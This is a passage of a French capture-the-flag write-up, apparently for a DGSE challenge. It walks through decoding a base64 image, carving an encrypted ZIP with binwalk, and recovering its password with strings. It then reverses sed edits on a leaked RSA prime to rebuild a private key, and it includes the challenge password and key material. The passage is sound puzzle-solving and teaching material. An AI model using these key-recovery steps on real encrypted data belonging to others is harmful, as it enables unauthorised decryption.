&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;text_extracted.txt | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
117798
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;text_extracted.txt | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 9,117797p &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file.b64
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;file.b64 | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-di&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file.bin
&lt;span class=&quot;c&quot;&gt;# -i, --ignore-garbage: when decoding, ignore non-alphabet characters&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file file.bin
file.bin: JPEG image data, progressive, precision 8, 2110x3508, frames 1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;file.bin file.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On retire les 9 premières lignes et on crée le fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;file.b64&lt;/code&gt;. On le décode avec &lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -id&lt;/code&gt;. On remarque que l’on a à faire à un JPG, on le renomme alors. On voit alors une image de Richelieu. Il y a sûrement d’autres choses dans un fichier si grand.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;zip&quot;&gt;ZIP&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk file.jpg
DECIMAL       HEXADECIMAL     DESCRIPTION
&lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------------------------------&lt;/span&gt;
445628        0x6CCBC         Zip archive data, encrypted, name: .bash_history
445979        0x6CE1B         Zip archive data, encrypted, name: suite.zip
446405        0x6CFC5         Zip archive data, encrypted, name: prime.txt
446943        0x6D1DF         Zip archive data, encrypted, name: public.key
447670        0x6D4B6         Zip archive data, encrypted, name: motDePasseGPG.txt.enc
448289        0x6D721         Zip archive data, encrypted, name: lsb_RGB.png.enc
6693156       0x662124        End of Zip archive, footer length: 22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Avec &lt;code class=&quot;highlighter-rouge&quot;&gt;binwalk&lt;/code&gt; on peut voir la présence d’une archive qui est composée de plusieurs fichiers intéressants.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk &lt;span class=&quot;nt&quot;&gt;--dd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.*&quot;&lt;/span&gt; file.jpg
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;_file.jpg.extracted/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ll
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 adel adel      22 mai   24 19:58 662124
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 adel adel 6247550 mai   24 19:58 6CCBC
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file 662124 
662124: Zip archive data &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file 6CCBC 
6CCBC: Zip archive data, at least v2.0 to extract
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;6CCBC file.zip
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip file.zip 
Archive:  file.zip
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;file.zip] .bash_history password:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Après extraction, on se retrouve avec 2 fichiers, un qui ne sert sûrement à rien (&lt;code class=&quot;highlighter-rouge&quot;&gt;662124&lt;/code&gt;) et un qui parait être utile: &lt;code class=&quot;highlighter-rouge&quot;&gt;6CCBC&lt;/code&gt;. C’est une archive chiffrée bien sûr. Il faut trouver un mot de passe. Après quelques recherches sans succès, revenons aux basiques.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings file.zip
&lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
a#W|+
~8!6
.bash_historyUT
Le mot de passePK
suite.zipUT
de cette archivePK
prime.txtUT
est : DGSE&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;t.D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;@Bx^A%n9FQB~_VL7Zn8z&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;:K^4ikE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;j0EGHqI&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;PK
public.keyUT
motDePasseGPG.txt.encUT
lsb_RGB.png.encUT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le mot de passe est sûrement sous nos yeux…&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;zip_files
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DGSE{t.D=@Bx^A%n9FQB~_VL7Zn8z=:K^4ikE=j0EGHqI}&quot;&lt;/span&gt; file.zip &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; zip_files
Archive:  file.zip
  inflating: zip_files/.bash_history  
 extracting: zip_files/suite.zip     
  inflating: zip_files/prime.txt     
  inflating: zip_files/public.key    
 extracting: zip_files/motDePasseGPG.txt.enc  
  inflating: zip_files/lsb_RGB.png.enc 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous avons accès à tous les fichiers du zip.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;zip_files/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ll
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 adel adel     578 avril 26 17:20 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 adel adel 6243231 avril 29 16:29 lsb_RGB.png.enc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 adel adel     512 avril 29 16:29 motDePasseGPG.txt.enc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 adel adel     868 avril 29 16:29 prime.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 adel adel     800 avril 29 16:29 public.key
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 adel adel     331 avril 29 16:28 suite.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Essayons donc de les parcourir et de faire une analyse rapide.&lt;/p&gt;

&lt;h4 id=&quot;bash_history&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt;&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file .bash_history 
.bash_history: ASCII text
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bash_history
 &lt;span class=&quot;c&quot;&gt;# gpg encryption&lt;/span&gt;
 1337  gpg &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; lsb_RGB.png.enc &lt;span class=&quot;nt&quot;&gt;--symmetric&lt;/span&gt; lsb_RGB.png
 
 &lt;span class=&quot;c&quot;&gt;# create file with futur GPG password ?&lt;/span&gt;
 1338  vim motDePasseGPG.txt
 
 &lt;span class=&quot;c&quot;&gt;# gen 4096 bits rsa private key&lt;/span&gt;
 1339  openssl genrsa &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; priv.key 4096
 
 &lt;span class=&quot;c&quot;&gt;# gen public key&lt;/span&gt;
 1340  openssl rsa &lt;span class=&quot;nt&quot;&gt;-pubout&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; public.key &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; priv.key
 
 &lt;span class=&quot;c&quot;&gt;# extract prime 1 from priv key ?&lt;/span&gt;
 1341  openssl rsa &lt;span class=&quot;nt&quot;&gt;-noout&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-text&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; priv.key | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;prime1 &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 18 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; prime.txt
 &lt;span class=&quot;c&quot;&gt;# -A NUM, --after-context=NUM: Print NUM lines of trailing context after matching lines.&lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;# change file content with sed !!&lt;/span&gt;
 1342  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/7f/fb/g'&lt;/span&gt; prime.txt
 1343  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/e1/66/g'&lt;/span&gt; prime.txt
 1344  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/f4/12/g'&lt;/span&gt; prime.txt
 1345  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/16/54/g'&lt;/span&gt; prime.txt
 1346  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/a4/57/g'&lt;/span&gt; prime.txt
 1347  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/b5/cd/g'&lt;/span&gt; prime.txt
 
 &lt;span class=&quot;c&quot;&gt;# encryption of motDePasseGPG.txt with public.key&lt;/span&gt;
 1348  openssl rsautl &lt;span class=&quot;nt&quot;&gt;-encrypt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pubin&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-inkey&lt;/span&gt; public.key &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; motDePasseGPG.txt &lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt; motDePasseGPG.txt.enc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt; sous Linux contient tout l’historique des commandes qui ont étaient exécutaient sur le terminal.&lt;/p&gt;

&lt;h4 id=&quot;motdepassegpgtxtenc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;motDePasseGPG.txt.enc &lt;/code&gt;&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file motDePasseGPG.txt.enc 
motDePasseGPG.txt.enc: data
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;motDePasseGPG.txt.enc 
&lt;span class=&quot;c&quot;&gt;# ciphered data&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On comprend rapidement que notre but sera de retrouver la clé privée utilisée pour réaliser le déchiffrement du fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;motDePasseGPG.txt.enc&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;primetxt&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;prime.txt&lt;/code&gt;&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file prime.txt 
prime.txt: ASCII text
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;prime.txt 
prim66:
    00:fb:40:dc:44:ba:03:d1:53:42:f7:59:08:e0:f9:
    30:05:96:64:4a:de:94:68:5e:08:e2:8c:9a:b1:64:
    0c:2f:62:c2:9a:b9:a2:39:82:4b:9e:be:eb:76:ae:
    6d:87:21:a3:5e:9e:d9:8d:7e:57:38:3e:59:09:34:
    a5:78:cd:f7:2e:89:5d:5c:37:52:ea:fd:f6:31:cc:
    ba:d2:d9:60:e4:45:1d:67:76:d2:1f:12:9c:9d:c9:
    b1:90:45:51:ed:d2:fb:dd:b6:74:b4:99:fb:b1:0a:
    d9:b7:c2:be:8b:57:07:22:0a:8e:3a:36:ff:6d:c1:
    1d:63:93:af:cb:4e:c0:47:9f:65:bf:df:e3:f0:5f:
    1e:98:61:45:74:ec:36:a7:a5:b1:f1:8d:3d:97:6b:
    5a:82:49:09:00:08:0d:9d:c2:74:57:4e:30:a1:39:
    68:2f:22:34:71:13:aa:3b:f2:20:4f:8e:10:eb:d4:
    d0:9b:cd:8c:c2:53:5f:9d:71:13:0c:0f:21:b6:6e:
    13:39:40:d3:a6:b1:eb:74:ad:dd:0a:29:14:81:b1:
    90:ad:e0:53:f0:89:c8:00:fe:dc:ad:56:59:fc:28:
    1d:c0:cf:5e:08:c0:54:33:24:a3:52:bb:f3:25:10:
    43:c3:73:b8:40:4f:fc:6b:6b:77:bd:5f:22:24:eb:
    fb:15
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Voici donc le fichier manipulé dans le &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt;, il ne faut pas oublier que ce dernier à été modifié après avoir été créé. Il faut donc penser à le modifier pour retrouver ses valeurs d’origines.&lt;/p&gt;

&lt;h4 id=&quot;publickey&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;public.key&lt;/code&gt;&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file public.key 
public.key: ASCII text
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;public.key 
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAzV+KJMdgUAiJejySLA6B
Lnad4KRkQsNQy3jHhoU589OKrICz5qUGYFkQ6FmYBrTR0Ujy9rgdoEeWqKWu4Y8p
6D4Wd1oqCgCHBUH2V07RQ4Y2rgoMEW4HEE9I9yCUhjo4aeHI/CIGJyeJYvsihz4x
VvGOVd7JTpcAZOx/Tg6IRUAS4v1d/l+NGb8XD5zLP0bg/RAZvLAtkIOgcDxhf5lj
eeZHg1SnOubmrLzh9DM+z68kNmo+l30808v+jYo4e9h2v9q4SI9vR78fvjMBD9LX
4itNsuVneDzgtgbbhrk3WXFMT2OWp/ufdMQCEEOw89RtJjPr1DqHeGPffWgPUGWH
wRndZBAMqDHOKvM9lRtSTF8GtJ9b8ss4HnQYGTDQaoBQXAar1b9IcPDJ+1gb2A26
iJZgY5+Tbt6o/l0Mnq5YBi7WkyUlg8ccx4K6YT4BQ45ptD+eZOyoT56gToEa17Oe
/Xh20ba1AcT0iszm8kI59sBAKHiBNc2Iw9Fb4PLrt96enBmnqTA3AF7gqaZAutoz
LsDQXunwioMjVKBIepJ9XogGbiVp5sXUaI5CK/oLJ8YXHG178Cm/2RZXUq8ZqnGz
Oh6nC2w3H7IeR/Un2At9BPWCrZ+ZNa9yNoLcAcqYgGIYcN7LetFWSM307xUwFvPm
2HkzuOxUz6H9+HxGcCCj51MCAwEAAQ&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; PUBLIC KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous possédons également, la clé publique utilisée pour le chiffrement.&lt;/p&gt;

&lt;h4 id=&quot;lsb_rgbpngenc&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;lsb_RGB.png.enc&lt;/code&gt;&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file lsb_RGB.png.enc 
lsb_RGB.png.enc: GPG symmetrically encrypted data &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;AES256 cipher&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;D’après le &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt;, ce fichier a été chiffré, avec GPG.&lt;/p&gt;

&lt;h4 id=&quot;suitezip&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;suite.zip&lt;/code&gt;&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file suite.zip 
suite.zip: Zip archive data, at least v2.0 to extract
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip suite.zip 
Archive:  suite.zip
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;suite.zip] suite.txt password:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Prochaine étape du challenge.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;attaque-sur-rsa&quot;&gt;Attaque sur RSA&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Commençons par essayer d’attaquer la clé publique, même si je pense qu’il y a peu de chances d’y arriver.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsactftool.py &lt;span class=&quot;nt&quot;&gt;--publickey&lt;/span&gt; ./public.key &lt;span class=&quot;nt&quot;&gt;--private&lt;/span&gt;
Killed
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsactftool.py &lt;span class=&quot;nt&quot;&gt;--publickey&lt;/span&gt; ./public.key &lt;span class=&quot;nt&quot;&gt;--uncipherfile&lt;/span&gt; ./motDePasseGPG.txt.enc
Killed 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pas possible d’attaquer la clé publique (module bien trop grand).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;prime.txt 
prim66:
    00:fb:40:dc:44:ba:03:d1:53:42:f7:59:08:e0:f9:
    30:05:96:64:4a:de:94:68:5e:08:e2:8c:9a:b1:64:
    0c:2f:62:c2:9a:b9:a2:39:82:4b:9e:be:eb:76:ae:
    6d:87:21:a3:5e:9e:d9:8d:7e:57:38:3e:59:09:34:
    a5:78:cd:f7:2e:89:5d:5c:37:52:ea:fd:f6:31:cc:
    ba:d2:d9:60:e4:45:1d:67:76:d2:1f:12:9c:9d:c9:
    b1:90:45:51:ed:d2:fb:dd:b6:74:b4:99:fb:b1:0a:
    d9:b7:c2:be:8b:57:07:22:0a:8e:3a:36:ff:6d:c1:
    1d:63:93:af:cb:4e:c0:47:9f:65:bf:df:e3:f0:5f:
    1e:98:61:45:74:ec:36:a7:a5:b1:f1:8d:3d:97:6b:
    5a:82:49:09:00:08:0d:9d:c2:74:57:4e:30:a1:39:
    68:2f:22:34:71:13:aa:3b:f2:20:4f:8e:10:eb:d4:
    d0:9b:cd:8c:c2:53:5f:9d:71:13:0c:0f:21:b6:6e:
    13:39:40:d3:a6:b1:eb:74:ad:dd:0a:29:14:81:b1:
    90:ad:e0:53:f0:89:c8:00:fe:dc:ad:56:59:fc:28:
    1d:c0:cf:5e:08:c0:54:33:24:a3:52:bb:f3:25:10:
    43:c3:73:b8:40:4f:fc:6b:6b:77:bd:5f:22:24:eb:
    fb:15
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nous devons donc travailler sur ce fichier.&lt;/p&gt;

&lt;p&gt;Rappels sur RSA:
&lt;script type=&quot;math/tex&quot;&gt;p*q = n \\
p: prime 1 \\
q: prime 2 \\
n: modulus \\&lt;/script&gt;
Tout d’abord, nous devons nettoyer &lt;code class=&quot;highlighter-rouge&quot;&gt;prime.txt&lt;/code&gt; afin de retrouver la valeur de $p$.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1341  openssl rsa &lt;span class=&quot;nt&quot;&gt;-noout&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-text&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt; priv.key | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;prime1 &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 18 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; prime.txt
1342  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/7f/fb/g'&lt;/span&gt; prime.txt
1343  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/e1/66/g'&lt;/span&gt; prime.txt
1344  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/f4/12/g'&lt;/span&gt; prime.txt
1345  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/16/54/g'&lt;/span&gt; prime.txt
1346  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/a4/57/g'&lt;/span&gt; prime.txt
1347  &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/b5/cd/g'&lt;/span&gt; prime.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La première commande permet de récupérer les 18 lignes se trouvant après la chaîne &lt;code class=&quot;highlighter-rouge&quot;&gt;prime1&lt;/code&gt;, ce qui correspond donc à notre $p$.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;prime.txt prime_good.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/cd/b5/g'&lt;/span&gt; prime_good.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/57/a4/g'&lt;/span&gt; prime_good.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/54/16/g'&lt;/span&gt; prime_good.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/12/f4/g'&lt;/span&gt; prime_good.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/66/e1/g'&lt;/span&gt; prime_good.txt
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/fb/7f/g'&lt;/span&gt; prime_good.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Les lignes suivantes, réalisent des substitutions sur le fichier à l’aide de la commande &lt;code class=&quot;highlighter-rouge&quot;&gt;sed&lt;/code&gt;, il faut donc les inverser pour connaître le contenu originel de &lt;code class=&quot;highlighter-rouge&quot;&gt;prime.txt&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;prime_good.txt 
prime1:
    00:7f:40:dc:44:ba:03:d1:53:42:f7:59:08:e0:f9:
    30:05:96:64:4a:de:94:68:5e:08:e2:8c:9a:b1:64:
    0c:2f:62:c2:9a:b9:a2:39:82:4b:9e:be:eb:76:ae:
    6d:87:21:a3:5e:9e:d9:8d:7e:a4:38:3e:59:09:34:
